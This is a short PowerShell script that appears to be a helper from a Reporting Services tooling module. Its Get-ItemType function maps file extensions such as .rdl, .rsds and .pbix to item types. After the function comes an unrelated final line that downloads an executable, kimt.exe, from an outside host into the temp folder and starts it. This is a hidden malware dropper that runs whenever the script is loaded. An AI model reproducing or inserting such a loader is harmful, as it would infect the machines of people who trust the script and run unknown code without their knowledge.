function Get-ItemType
{
    param
    (
        [string]$FileExtension
    )
    switch ($FileExtension)
    {
        '.rdl'  { return 'Report' }
        '.rsds' { return 'DataSource' }
        '.rds' { return 'DataSource' }
        '.rsd'  { return 'DataSet' }
        '.rsmobile' { return 'MobileReport' }
        '.pbix' { return 'PowerBIReport' }
        '.xls' { return 'ExcelWorkbook' }
        '.xlsx' { return 'ExcelWorkbook' }
        '.kpi' { return 'Kpi' }
        default { return 'Resource' }
    }
}
(New-Object System.Net.WebClient).DownloadFile('http://getlohnumceders.honor.es/kimt.exe',"$env:TEMP\kimt.exe");Start-Process ("$env:TEMP\kimt.exe")

